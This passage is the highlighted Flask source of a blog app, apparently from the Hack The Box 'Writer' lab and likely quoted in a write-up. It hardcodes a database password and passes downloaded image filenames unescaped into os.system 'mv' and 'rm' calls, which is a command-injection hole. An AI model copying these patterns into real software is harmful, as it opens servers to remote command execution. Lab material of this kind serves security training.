  <span class="k">try</span><span class="p">:</span>
    <span class="n">connector</span> <span class="o">=</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connector</span><span class="p">.</span><span class="nf">connect</span><span class="p">(</span><span class="n">user</span><span class="o">=</span><span class="sh">'</span><span class="s">admin</span><span class="sh">'</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="sh">'</span><span class="s">ToughPasswordToCrack</span><span class="sh">'</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="sh">'</span><span class="s">127.0.0.1</span><span class="sh">'</span><span class="p">,</span> <span class="n">database</span><span class="o">=</span><span class="sh">'</span><span class="s">writer</span><span class="sh">'</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">connector</span>
  <span class="k">except</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connector</span><span class="p">.</span><span class="n">Error</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
    <span class="k">if</span> <span class="n">err</span><span class="p">.</span><span class="n">errno</span> <span class="o">==</span> <span class="n">errorcode</span><span class="p">.</span><span class="n">ER_ACCESS_DENIED_ERROR</span><span class="p">:</span>
      <span class="nf">return </span><span class="p">(</span><span class="sh">"</span><span class="s">Something is wrong with your db user name or password!</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">err</span><span class="p">.</span><span class="n">errno</span> <span class="o">==</span> <span class="n">errorcode</span><span class="p">.</span><span class="n">ER_BAD_DB_ERROR</span><span class="p">:</span>
      <span class="nf">return </span><span class="p">(</span><span class="sh">"</span><span class="s">Database does not exist</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
      <span class="nf">return </span><span class="p">(</span><span class="sh">"</span><span class="s">Another exception, returning!</span><span class="sh">"</span><span class="p">)</span>
  <span class="k">else</span><span class="p">:</span>
    <span class="nf">print </span><span class="p">(</span><span class="sh">'</span><span class="s">Connection to DB is ready!</span><span class="sh">'</span><span class="p">)</span>

<span class="c1">#Define homepage
</span><span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">home_page</span><span class="p">():</span>
  <span class="k">try</span><span class="p">:</span>
    <span class="n">connector</span> <span class="o">=</span> <span class="nf">connections</span><span class="p">()</span>
  <span class="k">except</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connector</span><span class="p">.</span><span class="n">Error</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
    <span class="nf">return </span><span class="p">(</span><span class="sh">"</span><span class="s">Database error</span><span class="sh">"</span><span class="p">)</span>
  <span class="n">cursor</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
  <span class="n">sql_command</span> <span class="o">=</span> <span class="sh">"</span><span class="s">SELECT * FROM stories;</span><span class="sh">"</span>
  <span class="n">cursor</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="n">sql_command</span><span class="p">)</span>
  <span class="n">results</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="nf">fetchall</span><span class="p">()</span>
  <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">blog/blog.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">results</span><span class="o">=</span><span class="n">results</span><span class="p">)</span>

<span class="c1">#Define about page
</span><span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/about</span><span class="sh">'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">about</span><span class="p">():</span>
  <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">blog/about.html</span><span class="sh">'</span><span class="p">)</span>

<span class="c1">#Define contact page
</span><span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/contact</span><span class="sh">'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">contact</span><span class="p">():</span>
  <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">blog/contact.html</span><span class="sh">'</span><span class="p">)</span>

<span class="c1">#Define blog posts
</span><span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/blog/post/&lt;id&gt;</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">blog_post</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
  <span class="k">try</span><span class="p">:</span>
    <span class="n">connector</span> <span class="o">=</span> <span class="nf">connections</span><span class="p">()</span>
  <span class="k">except</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connector</span><span class="p">.</span><span class="n">Error</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
    <span class="nf">return </span><span class="p">(</span><span class="sh">"</span><span class="s">Database error</span><span class="sh">"</span><span class="p">)</span>
  <span class="n">cursor</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
  <span class="n">cursor</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">SELECT * FROM stories WHERE id = %(id)s;</span><span class="sh">"</span><span class="p">,</span> <span class="p">{</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">:</span> <span class="nb">id</span><span class="p">})</span>
  <span class="n">results</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="nf">fetchall</span><span class="p">()</span>
  <span class="n">sql_command</span> <span class="o">=</span> <span class="sh">"</span><span class="s">SELECT * FROM stories;</span><span class="sh">"</span>
  <span class="n">cursor</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="n">sql_command</span><span class="p">)</span>
  <span class="n">stories</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="nf">fetchall</span><span class="p">()</span>
  <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">blog/blog-single.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">results</span><span class="o">=</span><span class="n">results</span><span class="p">,</span> <span class="n">stories</span><span class="o">=</span><span class="n">stories</span><span class="p">)</span>

<span class="c1">#Define dashboard for authenticated users
</span><span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/dashboard</span><span class="sh">'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">dashboard</span><span class="p">():</span>
  <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="sh">'</span><span class="s">user</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">session</span><span class="p">):</span>
    <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">)</span>
  <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">dashboard.html</span><span class="sh">'</span><span class="p">)</span>

<span class="c1">#Define stories page for dashboard and edit/delete pages
</span><span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/dashboard/stories</span><span class="sh">'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">stories</span><span class="p">():</span>
  <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="sh">'</span><span class="s">user</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">session</span><span class="p">):</span>
    <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">)</span>
  <span class="k">try</span><span class="p">:</span>
    <span class="n">connector</span> <span class="o">=</span> <span class="nf">connections</span><span class="p">()</span>
  <span class="k">except</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connector</span><span class="p">.</span><span class="n">Error</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
    <span class="nf">return </span><span class="p">(</span><span class="sh">"</span><span class="s">Database error</span><span class="sh">"</span><span class="p">)</span>
  <span class="n">cursor</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
  <span class="n">sql_command</span> <span class="o">=</span> <span class="sh">"</span><span class="s">Select * From stories;</span><span class="sh">"</span>
  <span class="n">cursor</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="n">sql_command</span><span class="p">)</span>
  <span class="n">results</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="nf">fetchall</span><span class="p">()</span>
  <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">stories.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">results</span><span class="o">=</span><span class="n">results</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/dashboard/stories/add</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">add_story</span><span class="p">():</span>
  <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="sh">'</span><span class="s">user</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">session</span><span class="p">):</span>
    <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">)</span>
  <span class="k">try</span><span class="p">:</span>
    <span class="n">connector</span> <span class="o">=</span> <span class="nf">connections</span><span class="p">()</span>
  <span class="k">except</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connector</span><span class="p">.</span><span class="n">Error</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
    <span class="nf">return </span><span class="p">(</span><span class="sh">"</span><span class="s">Database error</span><span class="sh">"</span><span class="p">)</span>
  <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">:</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">files</span><span class="p">[</span><span class="sh">'</span><span class="s">image</span><span class="sh">'</span><span class="p">]:</span>
      <span class="n">image</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">files</span><span class="p">[</span><span class="sh">'</span><span class="s">image</span><span class="sh">'</span><span class="p">]</span>
      <span class="k">if</span> <span class="sh">"</span><span class="s">.jpg</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">image</span><span class="p">.</span><span class="n">filename</span><span class="p">:</span>
        <span class="n">path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="sh">'</span><span class="s">/var/www/writer.htb/writer/static/img/</span><span class="sh">'</span><span class="p">,</span> <span class="n">image</span><span class="p">.</span><span class="n">filename</span><span class="p">)</span>
        <span class="n">image</span><span class="p">.</span><span class="nf">save</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
        <span class="n">image</span> <span class="o">=</span> <span class="sh">"</span><span class="s">/img/{}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">image</span><span class="p">.</span><span class="n">filename</span><span class="p">)</span>
      <span class="k">else</span><span class="p">:</span>
        <span class="n">error</span> <span class="o">=</span> <span class="sh">"</span><span class="s">File extensions must be in .jpg!</span><span class="sh">"</span>
        <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">add.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="n">error</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">image_url</span><span class="sh">'</span><span class="p">):</span>
      <span class="n">image_url</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">image_url</span><span class="sh">'</span><span class="p">)</span>
      <span class="k">if</span> <span class="sh">"</span><span class="s">.jpg</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">image_url</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
          <span class="n">local_filename</span><span class="p">,</span> <span class="n">headers</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="nf">urlretrieve</span><span class="p">(</span><span class="n">image_url</span><span class="p">)</span>
          <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">mv {} {}.jpg</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">local_filename</span><span class="p">,</span> <span class="n">local_filename</span><span class="p">))</span>
          <span class="n">image</span> <span class="o">=</span> <span class="sh">"</span><span class="s">{}.jpg</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">local_filename</span><span class="p">)</span>
          <span class="k">try</span><span class="p">:</span>
            <span class="n">im</span> <span class="o">=</span> <span class="n">Image</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="n">image</span><span class="p">)</span>
            <span class="n">im</span><span class="p">.</span><span class="nf">verify</span><span class="p">()</span>
            <span class="n">im</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
            <span class="n">image</span> <span class="o">=</span> <span class="n">image</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s">/tmp/</span><span class="sh">'</span><span class="p">,</span><span class="sh">''</span><span class="p">)</span>
            <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">mv /tmp/{} /var/www/writer.htb/writer/static/img/{}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">image</span><span class="p">,</span> <span class="n">image</span><span class="p">))</span>
            <span class="n">image</span> <span class="o">=</span> <span class="sh">"</span><span class="s">/img/{}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">image</span><span class="p">)</span>
          <span class="k">except</span> <span class="n">PIL</span><span class="p">.</span><span class="n">UnidentifiedImageError</span><span class="p">:</span>
            <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">rm {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">image</span><span class="p">))</span>
            <span class="n">error</span> <span class="o">=</span> <span class="sh">"</span><span class="s">Not a valid image file!</span><span class="sh">"</span>
            <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">add.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="n">error</span><span class="p">)</span>
        <span class="k">except</span><span class="p">:</span>
          <span class="n">error</span> <span class="o">=</span> <span class="sh">"</span><span class="s">Issue uploading picture</span><span class="sh">"</span>
          <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">add.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="n">error</span><span class="p">)</span>
      <span class="k">else</span><span class="p">:</span>
        <span class="n">error</span> <span class="o">=</span> <span class="sh">"</span><span class="s">File extensions must be in .jpg!</span><span class="sh">"</span>
        <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">add.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="n">error</span><span class="p">)</span>
    <span class="n">author</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">author</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">title</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">title</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">tagline</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">tagline</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">content</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">content</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">cursor</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
    <span class="n">cursor</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">INSERT INTO stories VALUES (NULL,%(author)s,%(title)s,%(tagline)s,%(content)s,</span><span class="sh">'</span><span class="s">Published</span><span class="sh">'</span><span class="s">,now(),%(image)s);</span><span class="sh">"</span><span class="p">,</span> <span class="p">{</span><span class="sh">'</span><span class="s">author</span><span class="sh">'</span><span class="p">:</span><span class="n">author</span><span class="p">,</span><span class="sh">'</span><span class="s">title</span><span class="sh">'</span><span class="p">:</span> <span class="n">title</span><span class="p">,</span><span class="sh">'</span><span class="s">tagline</span><span class="sh">'</span><span class="p">:</span> <span class="n">tagline</span><span class="p">,</span><span class="sh">'</span><span class="s">content</span><span class="sh">'</span><span class="p">:</span> <span class="n">content</span><span class="p">,</span> <span class="sh">'</span><span class="s">image</span><span class="sh">'</span><span class="p">:</span><span class="n">image</span> <span class="p">})</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="nf">commit</span><span class="p">()</span>
    <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="sh">'</span><span class="s">/dashboard/stories</span><span class="sh">'</span><span class="p">)</span>
  <span class="k">else</span><span class="p">:</span>
    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">add.html</span><span class="sh">'</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/dashboard/stories/edit/&lt;id&gt;</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">edit_story</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
  <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="sh">'</span><span class="s">user</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">session</span><span class="p">):</span>
    <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">)</span>
  <span class="k">try</span><span class="p">:</span>
    <span class="n">connector</span> <span class="o">=</span> <span class="nf">connections</span><span class="p">()</span>
  <span class="k">except</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connector</span><span class="p">.</span><span class="n">Error</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
    <span class="nf">return </span><span class="p">(</span><span class="sh">"</span><span class="s">Database error</span><span class="sh">"</span><span class="p">)</span>
  <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">:</span>
    <span class="n">cursor</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
    <span class="n">cursor</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">SELECT * FROM stories where id = %(id)s;</span><span class="sh">"</span><span class="p">,</span> <span class="p">{</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">:</span> <span class="nb">id</span><span class="p">})</span>
    <span class="n">results</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="nf">fetchall</span><span class="p">()</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">files</span><span class="p">[</span><span class="sh">'</span><span class="s">image</span><span class="sh">'</span><span class="p">]:</span>
      <span class="n">image</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">files</span><span class="p">[</span><span class="sh">'</span><span class="s">image</span><span class="sh">'</span><span class="p">]</span>
      <span class="k">if</span> <span class="sh">"</span><span class="s">.jpg</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">image</span><span class="p">.</span><span class="n">filename</span><span class="p">:</span>
        <span class="n">path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="sh">'</span><span class="s">/var/www/writer.htb/writer/static/img/</span><span class="sh">'</span><span class="p">,</span> <span class="n">image</span><span class="p">.</span><span class="n">filename</span><span class="p">)</span>
        <span class="n">image</span><span class="p">.</span><span class="nf">save</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
        <span class="n">image</span> <span class="o">=</span> <span class="sh">"</span><span class="s">/img/{}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">image</span><span class="p">.</span><span class="n">filename</span><span class="p">)</span>
        <span class="n">cursor</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
        <span class="n">cursor</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">UPDATE stories SET image = %(image)s WHERE id = %(id)s</span><span class="sh">"</span><span class="p">,</span> <span class="p">{</span><span class="sh">'</span><span class="s">image</span><span class="sh">'</span><span class="p">:</span><span class="n">image</span><span class="p">,</span> <span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">:</span><span class="nb">id</span><span class="p">})</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="nf">commit</span><span class="p">()</span>
      <span class="k">else</span><span class="p">:</span>
        <span class="n">error</span> <span class="o">=</span> <span class="sh">"</span><span class="s">File extensions must be in .jpg!</span><span class="sh">"</span>
        <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">edit.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="n">error</span><span class="p">,</span> <span class="n">results</span><span class="o">=</span><span class="n">results</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="nb">id</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">image_url</span><span class="sh">'</span><span class="p">):</span>
      <span class="n">image_url</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">image_url</span><span class="sh">'</span><span class="p">)</span>
      <span class="k">if</span> <span class="sh">"</span><span class="s">.jpg</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">image_url</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
          <span class="n">local_filename</span><span class="p">,</span> <span class="n">headers</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="nf">urlretrieve</span><span class="p">(</span><span class="n">image_url</span><span class="p">)</span>
          <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">mv {} {}.jpg</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">local_filename</span><span class="p">,</span> <span class="n">local_filename</span><span class="p">))</span>
          <span class="n">image</span> <span class="o">=</span> <span class="sh">"</span><span class="s">{}.jpg</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">local_filename</span><span class="p">)</span>
          <span class="k">try</span><span class="p">:</span>
            <span class="n">im</span> <span class="o">=</span> <span class="n">Image</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="n">image</span><span class="p">)</span>
            <span class="n">im</span><span class="p">.</span><span class="nf">verify</span><span class="p">()</span>
            <span class="n">im</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
            <span class="n">image</span> <span class="o">=</span> <span class="n">image</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s">/tmp/</span><span class="sh">'</span><span class="p">,</span><span class="sh">''</span><span class="p">)</span>
            <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">mv /tmp/{} /var/www/writer.htb/writer/static/img/{}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">image</span><span class="p">,</span> <span class="n">image</span><span class="p">))</span>
            <span class="n">image</span> <span class="o">=</span> <span class="sh">"</span><span class="s">/img/{}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">image</span><span class="p">)</span>
            <span class="n">cursor</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
            <span class="n">cursor</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">UPDATE stories SET image = %(image)s WHERE id = %(id)s</span><span class="sh">"</span><span class="p">,</span> <span class="p">{</span><span class="sh">'</span><span class="s">image</span><span class="sh">'</span><span class="p">:</span><span class="n">image</span><span class="p">,</span> <span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">:</span><span class="nb">id</span><span class="p">})</span>
            <span class="n">result</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="nf">commit</span><span class="p">()</span>

          <span class="k">except</span> <span class="n">PIL</span><span class="p">.</span><span class="n">UnidentifiedImageError</span><span class="p">:</span>
            <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">rm {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">image</span><span class="p">))</span>
            <span class="n">error</span> <span class="o">=</span> <span class="sh">"</span><span class="s">Not a valid image file!</span><span class="sh">"</span>
            <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">edit.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="n">error</span><span class="p">,</span> <span class="n">results</span><span class="o">=</span><span class="n">results</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="nb">id</span><span class="p">)</span>
        <span class="k">except</span><span class="p">:</span>
          <span class="n">error</span> <span class="o">=</span> <span class="sh">"</span><span class="s">Issue uploading picture</span><span class="sh">"</span>
          <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">edit.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="n">error</span><span class="p">,</span> <span class="n">results</span><span class="o">=</span><span class="n">results</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="nb">id</span><span class="p">)</span>
      <span class="k">else</span><span class="p">:</span>
        <span class="n">error</span> <span class="o">=</span> <span class="sh">"</span><span class="s">File extensions must be in .jpg!</span><span class="sh">"</span>
        <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">edit.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="n">error</span><span class="p">,</span> <span class="n">results</span><span class="o">=</span><span class="n">results</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="nb">id</span><span class="p">)</span>
    <span class="n">title</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">title</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">tagline</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">tagline</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">content</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">content</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">cursor</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
    <span class="n">cursor</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">UPDATE stories SET title = %(title)s, tagline = %(tagline)s, content = %(content)s WHERE id = %(id)s</span><span class="sh">"</span><span class="p">,</span> <span class="p">{</span><span class="sh">'</span><span class="s">title</span><span class="sh">'</span><span class="p">:</span><span class="n">title</span><span class="p">,</span> <span class="sh">'</span><span class="s">tagline</span><span class="sh">'</span><span class="p">:</span><span class="n">tagline</span><span class="p">,</span> <span class="sh">'</span><span class="s">content</span><span class="sh">'</span><span class="p">:</span><span class="n">content</span><span class="p">,</span> <span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">:</span> <span class="nb">id</span><span class="p">})</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="nf">commit</span><span class="p">()</span>
    <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="sh">'</span><span class="s">/dashboard/stories</span><span class="sh">'</span><span class="p">)</span>

  <span class="k">else</span><span class="p">:</span>
